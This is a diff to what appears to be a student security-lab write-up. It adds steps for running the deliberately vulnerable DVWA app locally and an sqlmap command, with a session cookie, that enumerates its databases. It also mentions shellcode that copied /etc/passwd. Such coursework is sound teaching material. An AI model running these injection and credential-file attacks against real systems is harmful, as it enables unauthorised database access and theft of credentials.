@@ -208,7 +208,7 @@ cat /tmp/outfile
 
 After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, not /tmp/pwfile
 
-**Conclusion**: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection.
+**Conclusion**: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection, return-to-lib-c.
 
 # Task 2: Attack on database of DVWA
 - Install dvwa (on host machine or docker container)
@@ -218,12 +218,57 @@ After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, n
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
+## 1. Set up environment
+
+Clone dvwa from github
+
+```
+git clone https://github.com/digininja/DVWA.git
+```
+
+Then, we build by using docker
+
+```
+docker-compose up -d
+```
+
+DVWA is now available at http://localhost:4280
+
+<img alt="Screenshot" src="./img/task2/1.png">
+
+Clone sqlmap from github
+
+```
+git clone https://github.com/sqlmapproject/sqlmap.git
+```
+
+## 2. Use sqlmap
+
+First of all, we have to set the security level of website at low
+
+<img alt="Screenshot" src="./img/task2/2.png">
+
+And then, we copy the cookies
+
+<img alt="Screenshot" src="./img/task2/3.png">
+
+Enter a function that we can exploit
+
+```
+http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Submit#
+```
+
+<img alt="Screenshot" src="./img/task2/4.png">
+
+Use the command below to get information about all available databases
+
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=c3243e5dcda438603c9d3ae
+ce31e8670; security=low" --dbs
+```
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
-
-
-
